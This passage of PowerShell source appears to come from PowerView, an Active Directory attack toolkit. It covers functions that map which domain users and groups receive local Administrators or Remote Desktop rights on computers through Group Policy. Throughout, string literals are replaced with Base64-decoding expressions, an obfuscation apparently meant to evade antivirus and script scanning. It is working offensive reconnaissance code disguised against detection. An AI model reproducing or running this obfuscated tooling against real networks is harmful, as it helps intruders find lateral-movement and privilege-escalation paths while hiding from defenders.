                    $MembershipValue = $Membership.Value | Where-Object {$_} | ForEach-Object { $_.Trim(([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("Kg==")))) } | Where-Object {$_}

                    if ($PSBoundParameters[([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("UmVzb2x2ZU1lbWJlcnNUb1NJRHM=")))]) {
                        
                        $GroupMembers = @()
                        ForEach ($Member in $MembershipValue) {
                            if ($Member -and ($Member.Trim() -ne '')) {
                                if ($Member -notmatch ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("XlMtMS0uKg==")))) {
                                    $ConvertToArguments = @{([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("T2JqZWN0TmFtZQ=="))) = $Member}
                                    if ($PSBoundParameters[([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("RG9tYWlu")))]) { $ConvertToArguments[([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("RG9tYWlu")))] = $Domain }
                                    $MemberSID = ConvertTo-SID @ConvertToArguments

                                    if ($MemberSID) {
                                        $GroupMembers += $MemberSID
                                    }
                                    else {
                                        $GroupMembers += $Member
                                    }
                                }
                                else {
                                    $GroupMembers += $Member
                                }
                            }
                        }
                        $MembershipValue = $GroupMembers
                    }

                    if (-not $Memberships[$Group]) {
                        $Memberships[$Group] = @{}
                    }
                    if ($MembershipValue -isnot [System.Array]) {$MembershipValue = @($MembershipValue)}
                    $Memberships[$Group].Add($Relation, $MembershipValue)
                }

                ForEach ($Membership in $Memberships.GetEnumerator()) {
                    if ($Membership -and $Membership.Key -and ($Membership.Key -match ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("Xlwq"))))) {
                        
                        $GroupSID = $Membership.Key.Trim(([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("Kg=="))))
                        if ($GroupSID -and ($GroupSID.Trim() -ne '')) {
                            $GroupName = ConvertFrom-SID -ObjectSID $GroupSID @ConvertArguments
                        }
                        else {
                            $GroupName = $False
                        }
                    }
                    else {
                        $GroupName = $Membership.Key

                        if ($GroupName -and ($GroupName.Trim() -ne '')) {
                            if ($Groupname -match ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("QWRtaW5pc3RyYXRvcnM=")))) {
                                $GroupSID = ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("Uy0xLTUtMzItNTQ0")))
                            }
                            elseif ($Groupname -match ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("UmVtb3RlIERlc2t0b3A=")))) {
                                $GroupSID = ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("Uy0xLTUtMzItNTU1")))
                            }
                            elseif ($Groupname -match ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("R3Vlc3Rz")))) {
                                $GroupSID = ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("Uy0xLTUtMzItNTQ2")))
                            }
                            elseif ($GroupName.Trim() -ne '') {
                                $ConvertToArguments = @{([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("T2JqZWN0TmFtZQ=="))) = $Groupname}
                                if ($PSBoundParameters[([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("RG9tYWlu")))]) { $ConvertToArguments[([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("RG9tYWlu")))] = $Domain }
                                $GroupSID = ConvertTo-SID @ConvertToArguments
                            }
                            else {
                                $GroupSID = $Null
                            }
                        }
                    }

                    $GPOGroup = New-Object PSObject
                    $GPOGroup | Add-Member Noteproperty ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("R1BPRGlzcGxheU5hbWU="))) $GPODisplayName
                    $GPOGroup | Add-Member Noteproperty ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("R1BPTmFtZQ=="))) $GPOName
                    $GPOGroup | Add-Member Noteproperty ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("R1BPUGF0aA=="))) $GPOPath
                    $GPOGroup | Add-Member Noteproperty ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("R1BPVHlwZQ=="))) ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("UmVzdHJpY3RlZEdyb3Vwcw==")))
                    $GPOGroup | Add-Member Noteproperty ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("RmlsdGVycw=="))) $Null
                    $GPOGroup | Add-Member Noteproperty ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("R3JvdXBOYW1l"))) $GroupName
                    $GPOGroup | Add-Member Noteproperty ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("R3JvdXBTSUQ="))) $GroupSID
                    $GPOGroup | Add-Member Noteproperty ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("R3JvdXBNZW1iZXJPZg=="))) $Membership.Value.Memberof
                    $GPOGroup | Add-Member Noteproperty ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("R3JvdXBNZW1iZXJz"))) $Membership.Value.Members
                    $GPOGroup.PSObject.TypeNames.Insert(0, ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("UG93ZXJWaWV3LkdQT0dyb3Vw"))))
                    $GPOGroup
                }
            }

            
            $ParseArgs =  @{
                ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("R3JvdXBzWE1McGF0aA=="))) = ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("JEdQT1BhdGhcTUFDSElORVxQcmVmZXJlbmNlc1xHcm91cHNcR3JvdXBzLnhtbA==")))
            }

            Get-GroupsXML @ParseArgs | ForEach-Object {
                if ($PSBoundParameters[([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("UmVzb2x2ZU1lbWJlcnNUb1NJRHM=")))]) {
                    $GroupMembers = @()
                    ForEach ($Member in $_.GroupMembers) {
                        if ($Member -and ($Member.Trim() -ne '')) {
                            if ($Member -notmatch ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("XlMtMS0uKg==")))) {

                                
                                $ConvertToArguments = @{([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("T2JqZWN0TmFtZQ=="))) = $Groupname}
                                if ($PSBoundParameters[([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("RG9tYWlu")))]) { $ConvertToArguments[([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("RG9tYWlu")))] = $Domain }
                                $MemberSID = ConvertTo-SID -Domain $Domain -ObjectName $Member

                                if ($MemberSID) {
                                    $GroupMembers += $MemberSID
                                }
                                else {
                                    $GroupMembers += $Member
                                }
                            }
                            else {
                                $GroupMembers += $Member
                            }
                        }
                    }
                    $_.GroupMembers = $GroupMembers
                }

                $_ | Add-Member Noteproperty ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("R1BPRGlzcGxheU5hbWU="))) $GPODisplayName
                $_ | Add-Member Noteproperty ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("R1BPTmFtZQ=="))) $GPOName
                $_ | Add-Member Noteproperty ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("R1BPVHlwZQ=="))) ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("R3JvdXBQb2xpY3lQcmVmZXJlbmNlcw==")))
                $_.PSObject.TypeNames.Insert(0, ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("UG93ZXJWaWV3LkdQT0dyb3Vw"))))
                $_
            }
        }
    }
}


function Get-DomainGPOUserLocalGroupMapping {


    [Diagnostics.CodeAnalysis.SuppressMessageAttribute('PSShouldProcess', '')]
    [OutputType('PowerView.GPOUserLocalGroupMapping')]
    [CmdletBinding()]
    Param(
        [Parameter(Position = 0, ValueFromPipeline = $True, ValueFromPipelineByPropertyName = $True)]
        [Alias('DistinguishedName', 'SamAccountName', 'Name')]
        [String]
        $Identity,

        [String]
        [ValidateSet('Administrators', 'S-1-5-32-544', 'RDP', 'Remote Desktop Users', 'S-1-5-32-555')]
        $LocalGroup = ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("QWRtaW5pc3RyYXRvcnM="))),

        [ValidateNotNullOrEmpty()]
        [String]
        $Domain,

        [ValidateNotNullOrEmpty()]
        [Alias('ADSPath')]
        [String]
        $SearchBase,

        [ValidateNotNullOrEmpty()]
        [Alias('DomainController')]
        [String]
        $Server,

        [ValidateSet('Base', 'OneLevel', 'Subtree')]
        [String]
        $SearchScope = ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("U3VidHJlZQ=="))),

        [ValidateRange(1, 10000)]
        [Int]
        $ResultPageSize = 200,

        [ValidateRange(1, 10000)]
        [Int]
        $ServerTimeLimit,

        [Switch]
        $Tombstone,

        [Management.Automation.PSCredential]
        [Management.Automation.CredentialAttribute()]
        $Credential = [Management.Automation.PSCredential]::Empty
    )

    BEGIN {
        $CommonArguments = @{}
        if ($PSBoundParameters[([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("RG9tYWlu")))]) { $CommonArguments[([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("RG9tYWlu")))] = $Domain }
        if ($PSBoundParameters[([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("U2VydmVy")))]) { $CommonArguments[([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("U2VydmVy")))] = $Server }
        if ($PSBoundParameters[([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("U2VhcmNoU2NvcGU=")))]) { $CommonArguments[([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("U2VhcmNoU2NvcGU=")))] = $SearchScope }
        if ($PSBoundParameters[([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("UmVzdWx0UGFnZVNpemU=")))]) { $CommonArguments[([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("UmVzdWx0UGFnZVNpemU=")))] = $ResultPageSize }
        if ($PSBoundParameters[([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("U2VydmVyVGltZUxpbWl0")))]) { $CommonArguments[([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("U2VydmVyVGltZUxpbWl0")))] = $ServerTimeLimit }
        if ($PSBoundParameters[([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("VG9tYnN0b25l")))]) { $CommonArguments[([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("VG9tYnN0b25l")))] = $Tombstone }
        if ($PSBoundParameters[([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("Q3JlZGVudGlhbA==")))]) { $CommonArguments[([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("Q3JlZGVudGlhbA==")))] = $Credential }
    }

    PROCESS {
        $TargetSIDs = @()

        if ($PSBoundParameters[([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("SWRlbnRpdHk=")))]) {
            $TargetSIDs += Get-DomainObject @CommonArguments -Identity $Identity | Select-Object -Expand objectsid
            $TargetObjectSID = $TargetSIDs
            if (-not $TargetSIDs) {
                Throw ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("W0dldC1Eb21haW5HUE9Vc2VyTG9jYWxHcm91cE1hcHBpbmddIFVuYWJsZSB0byByZXRyaWV2ZSBTSUQgZm9yIGlkZW50aXR5ICckSWRlbnRpdHk=")))
            }
        }
        else {
            
            $TargetSIDs = @(([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("Kg=="))))
        }

        if ($LocalGroup -match ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("Uy0xLTU=")))) {
            $TargetLocalSID = $LocalGroup
        }
        elseif ($LocalGroup -match ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("QWRtaW4=")))) {
            $TargetLocalSID = ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("Uy0xLTUtMzItNTQ0")))
        }
        else {
            
            $TargetLocalSID = ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("Uy0xLTUtMzItNTU1")))
        }

        if ($TargetSIDs[0] -ne ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("Kg==")))) {
            ForEach ($TargetSid in $TargetSids) {
                Write-Verbose ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("W0dldC1Eb21haW5HUE9Vc2VyTG9jYWxHcm91cE1hcHBpbmddIEVudW1lcmF0aW5nIG5lc3RlZCBncm91cCBtZW1iZXJzaGlwcyBmb3I6ICckVGFyZ2V0U2lk")))
                $TargetSIDs += Get-DomainGroup @CommonArguments -Properties ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("b2JqZWN0c2lk"))) -MemberIdentity $TargetSid | Select-Object -ExpandProperty objectsid
            }
        }

        Write-Verbose ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("W0dldC1Eb21haW5HUE9Vc2VyTG9jYWxHcm91cE1hcHBpbmddIFRhcmdldCBsb2NhbGdyb3VwIFNJRDogJFRhcmdldExvY2FsU0lE")))
        Write-Verbose ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("W0dldC1Eb21haW5HUE9Vc2VyTG9jYWxHcm91cE1hcHBpbmddIEVmZmVjdGl2ZSB0YXJnZXQgZG9tYWluIFNJRHM6ICRUYXJnZXRTSURz")))

        $GPOgroups = Get-DomainGPOLocalGroup @CommonArguments -ResolveMembersToSIDs | ForEach-Object {
            $GPOgroup = $_
            
            if ($GPOgroup.GroupSID -match $TargetLocalSID) {
                $GPOgroup.GroupMembers | Where-Object {$_} | ForEach-Object {
                    if ( ($TargetSIDs[0] -eq ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("Kg==")))) -or ($TargetSIDs -Contains $_) ) {
                        $GPOgroup
                    }
                }
            }
            
            if ( ($GPOgroup.GroupMemberOf -contains $TargetLocalSID) ) {
                if ( ($TargetSIDs[0] -eq ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("Kg==")))) -or ($TargetSIDs -Contains $GPOgroup.GroupSID) ) {
                    $GPOgroup
                }
            }
        } | Sort-Object -Property GPOName -Unique

        $GPOgroups | Where-Object {$_} | ForEach-Object {
            $GPOname = $_.GPODisplayName
            $GPOguid = $_.GPOName
            $GPOPath = $_.GPOPath
            $GPOType = $_.GPOType
            if ($_.GroupMembers) {
                $GPOMembers = $_.GroupMembers
            }
            else {
                $GPOMembers = $_.GroupSID
            }

            $Filters = $_.Filters

            if ($TargetSIDs[0] -eq ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("Kg==")))) {
                
                $TargetObjectSIDs = $GPOMembers
            }
            else {
                $TargetObjectSIDs = $TargetObjectSID
            }

            
            Get-DomainOU @CommonArguments -Raw -Properties ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("bmFtZSxkaXN0aW5ndWlzaGVkbmFtZQ=="))) -GPLink $GPOGuid | ForEach-Object {
                if ($Filters) {
                    $OUComputers = Get-DomainComputer @CommonArguments -Properties ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("ZG5zaG9zdG5hbWUsZGlzdGluZ3Vpc2hlZG5hbWU="))) -SearchBase $_.Path | Where-Object {$_.distinguishedname -match ($Filters.Value)} | Select-Object -ExpandProperty dnshostname
                }
                else {
                    $OUComputers = Get-DomainComputer @CommonArguments -Properties ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("ZG5zaG9zdG5hbWU="))) -SearchBase $_.Path | Select-Object -ExpandProperty dnshostname
                }

                if ($OUComputers) {
                    if ($OUComputers -isnot [System.Array]) {$OUComputers = @($OUComputers)}

                    ForEach ($TargetSid in $TargetObjectSIDs) {
                        $Object = Get-DomainObject @CommonArguments -Identity $TargetSid -Properties ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("c2FtYWNjb3VudHR5cGUsc2FtYWNjb3VudG5hbWUsZGlzdGluZ3Vpc2hlZG5hbWUsb2JqZWN0c2lk")))

                        $IsGroup = @(([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("MjY4NDM1NDU2"))),([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("MjY4NDM1NDU3"))),([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("NTM2ODcwOTEy"))),([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("NTM2ODcwOTEz")))) -contains $Object.samaccounttype

                        $GPOLocalGroupMapping = New-Object PSObject
                        $GPOLocalGroupMapping | Add-Member Noteproperty ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("T2JqZWN0TmFtZQ=="))) $Object.samaccountname
                        $GPOLocalGroupMapping | Add-Member Noteproperty ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("T2JqZWN0RE4="))) $Object.distinguishedname
                        $GPOLocalGroupMapping | Add-Member Noteproperty ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("T2JqZWN0U0lE"))) $Object.objectsid
                        $GPOLocalGroupMapping | Add-Member Noteproperty ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("RG9tYWlu"))) $Domain
                        $GPOLocalGroupMapping | Add-Member Noteproperty ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("SXNHcm91cA=="))) $IsGroup
                        $GPOLocalGroupMapping | Add-Member Noteproperty ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("R1BPRGlzcGxheU5hbWU="))) $GPOname
                        $GPOLocalGroupMapping | Add-Member Noteproperty ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("R1BPR3VpZA=="))) $GPOGuid
                        $GPOLocalGroupMapping | Add-Member Noteproperty ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("R1BPUGF0aA=="))) $GPOPath
                        $GPOLocalGroupMapping | Add-Member Noteproperty ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("R1BPVHlwZQ=="))) $GPOType
                        $GPOLocalGroupMapping | Add-Member Noteproperty ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("Q29udGFpbmVyTmFtZQ=="))) $_.Properties.distinguishedname
                        $GPOLocalGroupMapping | Add-Member Noteproperty ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("Q29tcHV0ZXJOYW1l"))) $OUComputers
                        $GPOLocalGroupMapping.PSObject.TypeNames.Insert(0, ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("UG93ZXJWaWV3LkdQT0xvY2FsR3JvdXBNYXBwaW5n"))))
                        $GPOLocalGroupMapping
                    }
                }
            }

            
            Get-DomainSite @CommonArguments -Properties ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("c2l0ZW9iamVjdGJsLGRpc3Rpbmd1aXNoZWRuYW1l"))) -GPLink $GPOGuid | ForEach-Object {
                ForEach ($TargetSid in $TargetObjectSIDs) {
                    $Object = Get-DomainObject @CommonArguments -Identity $TargetSid -Properties ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("c2FtYWNjb3VudHR5cGUsc2FtYWNjb3VudG5hbWUsZGlzdGluZ3Vpc2hlZG5hbWUsb2JqZWN0c2lk")))

                    $IsGroup = @(([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("MjY4NDM1NDU2"))),([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("MjY4NDM1NDU3"))),([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("NTM2ODcwOTEy"))),([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("NTM2ODcwOTEz")))) -contains $Object.samaccounttype

                    $GPOLocalGroupMapping = New-Object PSObject
                    $GPOLocalGroupMapping | Add-Member Noteproperty ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("T2JqZWN0TmFtZQ=="))) $Object.samaccountname
                    $GPOLocalGroupMapping | Add-Member Noteproperty ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("T2JqZWN0RE4="))) $Object.distinguishedname
                    $GPOLocalGroupMapping | Add-Member Noteproperty ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("T2JqZWN0U0lE"))) $Object.objectsid
                    $GPOLocalGroupMapping | Add-Member Noteproperty ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("SXNHcm91cA=="))) $IsGroup
                    $GPOLocalGroupMapping | Add-Member Noteproperty ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("RG9tYWlu"))) $Domain
                    $GPOLocalGroupMapping | Add-Member Noteproperty ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("R1BPRGlzcGxheU5hbWU="))) $GPOname
                    $GPOLocalGroupMapping | Add-Member Noteproperty ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("R1BPR3VpZA=="))) $GPOGuid
                    $GPOLocalGroupMapping | Add-Member Noteproperty ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("R1BPUGF0aA=="))) $GPOPath
                    $GPOLocalGroupMapping | Add-Member Noteproperty ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("R1BPVHlwZQ=="))) $GPOType
                    $GPOLocalGroupMapping | Add-Member Noteproperty ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("Q29udGFpbmVyTmFtZQ=="))) $_.distinguishedname
                    $GPOLocalGroupMapping | Add-Member Noteproperty ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("Q29tcHV0ZXJOYW1l"))) $_.siteobjectbl
                    $GPOLocalGroupMapping.PSObject.TypeNames.Add(([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("UG93ZXJWaWV3LkdQT0xvY2FsR3JvdXBNYXBwaW5n"))))
                    $GPOLocalGroupMapping
                }
            }
        }
    }
}


function Get-DomainGPOComputerLocalGroupMapping {


    [Diagnostics.CodeAnalysis.SuppressMessageAttribute('PSShouldProcess', '')]
    [OutputType('PowerView.GGPOComputerLocalGroupMember')]
    [CmdletBinding(DefaultParameterSetName = 'ComputerIdentity')]
    Param(
        [Parameter(Position = 0, ParameterSetName = 'ComputerIdentity', Mandatory = $True, ValueFromPipeline = $True, ValueFromPipelineByPropertyName = $True)]
        [Alias('ComputerName', 'Computer', 'DistinguishedName', 'SamAccountName', 'Name')]
        [String]
        $ComputerIdentity,

        [Parameter(Mandatory = $True, ParameterSetName = 'OUIdentity')]
        [Alias('OU')]
        [String]
        $OUIdentity,

        [String]
        [ValidateSet('Administrators', 'S-1-5-32-544', 'RDP', 'Remote Desktop Users', 'S-1-5-32-555')]
        $LocalGroup = ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("QWRtaW5pc3RyYXRvcnM="))),

        [ValidateNotNullOrEmpty()]
        [String]
        $Domain,

        [ValidateNotNullOrEmpty()]
        [Alias('ADSPath')]
        [String]
        $SearchBase,

        [ValidateNotNullOrEmpty()]
        [Alias('DomainController')]
        [String]
        $Server,

        [ValidateSet('Base', 'OneLevel', 'Subtree')]
        [String]
        $SearchScope = ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("U3VidHJlZQ=="))),

        [ValidateRange(1, 10000)]
        [Int]
        $ResultPageSize = 200,

        [ValidateRange(1, 10000)]
        [Int]
        $ServerTimeLimit,

        [Switch]
        $Tombstone,

        [Management.Automation.PSCredential]
        [Management.Automation.CredentialAttribute()]
        $Credential = [Management.Automation.PSCredential]::Empty
    )

    BEGIN {
        $CommonArguments = @{}
        if ($PSBoundParameters[([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("RG9tYWlu")))]) { $CommonArguments[([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("RG9tYWlu")))] = $Domain }
        if ($PSBoundParameters[([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("U2VydmVy")))]) { $CommonArguments[([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("U2VydmVy")))] = $Server }
        if ($PSBoundParameters[([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("U2VhcmNoU2NvcGU=")))]) { $CommonArguments[([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("U2VhcmNoU2NvcGU=")))] = $SearchScope }
        if ($PSBoundParameters[([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("UmVzdWx0UGFnZVNpemU=")))]) { $CommonArguments[([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("UmVzdWx0UGFnZVNpemU=")))] = $ResultPageSize }
        if ($PSBoundParameters[([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("U2VydmVyVGltZUxpbWl0")))]) { $CommonArguments[([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("U2VydmVyVGltZUxpbWl0")))] = $ServerTimeLimit }
        if ($PSBoundParameters[([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("VG9tYnN0b25l")))]) { $CommonArguments[([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("VG9tYnN0b25l")))] = $Tombstone }
        if ($PSBoundParameters[([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("Q3JlZGVudGlhbA==")))]) { $CommonArguments[([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("Q3JlZGVudGlhbA==")))] = $Credential }
    }

    PROCESS {
        if ($PSBoundParameters[([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("Q29tcHV0ZXJJZGVudGl0eQ==")))]) {
            $Computers = Get-DomainComputer @CommonArguments -Identity $ComputerIdentity -Properties ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("ZGlzdGluZ3Vpc2hlZG5hbWUsZG5zaG9zdG5hbWU=")))

            if (-not $Computers) {
                throw ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("W0dldC1Eb21haW5HUE9Db21wdXRlckxvY2FsR3JvdXBNYXBwaW5nXSBDb21wdXRlciAkQ29tcHV0ZXJJZGVudGl0eSBub3QgZm91bmQuIFRyeSBhIGZ1bGx5IHF1YWxpZmllZCBob3N0IG5hbWUu")))
            }

            ForEach ($Computer in $Computers) {

                $GPOGuids = @()

                
                $DN = $Computer.distinguishedname
                $OUIndex = $DN.IndexOf(([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("T1U9"))))
                if ($OUIndex -gt 0) {
                    $OUName = $DN.SubString($OUIndex)
                }
                if ($OUName) {
                    $GPOGuids += Get-DomainOU @CommonArguments -SearchBase $OUName -LDAPFilter ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("KGdwbGluaz0qKQ=="))) | ForEach-Object {
                        Select-String -InputObject $_.gplink -Pattern ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("KFx7KXswLDF9WzAtOWEtZkEtRl17OH1cLVswLTlhLWZBLUZdezR9XC1bMC05YS1mQS1GXXs0fVwtWzAtOWEtZkEtRl17NH1cLVswLTlhLWZBLUZdezEyfShcfSl7MCwxfQ=="))) -AllMatches | ForEach-Object {$_.Matches | Select-Object -ExpandProperty Value }
                    }
                }

                
                Write-Verbose (([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("RW51bWVyYXRpbmcgdGhlIHNpdGVuYW1lIGZvcjogezB9"))) -f $($Computer.dnshostname))
                $ComputerSite = (Get-NetComputerSiteName -ComputerName $Computer.dnshostname).SiteName
                if ($ComputerSite -and ($ComputerSite -notmatch ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("RXJyb3I="))))) {
                    $GPOGuids += Get-DomainSite @CommonArguments -Identity $ComputerSite -LDAPFilter ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("KGdwbGluaz0qKQ=="))) | ForEach-Object {
                        Select-String -InputObject $_.gplink -Pattern ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("KFx7KXswLDF9WzAtOWEtZkEtRl17OH1cLVswLTlhLWZBLUZdezR9XC1bMC05YS1mQS1GXXs0fVwtWzAtOWEtZkEtRl17NH1cLVswLTlhLWZBLUZdezEyfShcfSl7MCwxfQ=="))) -AllMatches | ForEach-Object {$_.Matches | Select-Object -ExpandProperty Value }
                    }
                }

                
                $GPOGuids | Get-DomainGPOLocalGroup @CommonArguments | Sort-Object -Property GPOName -Unique | ForEach-Object {
                    $GPOGroup = $_

                    if($GPOGroup.GroupMembers) {
                        $GPOMembers = $GPOGroup.GroupMembers
                    }
                    else {
                        $GPOMembers = $GPOGroup.GroupSID
                    }

                    $GPOMembers | ForEach-Object {
                        $Object = Get-DomainObject @CommonArguments -Identity $_
                        $IsGroup = @(([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("MjY4NDM1NDU2"))),([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("MjY4NDM1NDU3"))),([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("NTM2ODcwOTEy"))),([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("NTM2ODcwOTEz")))) -contains $Object.samaccounttype

                        $GPOComputerLocalGroupMember = New-Object PSObject
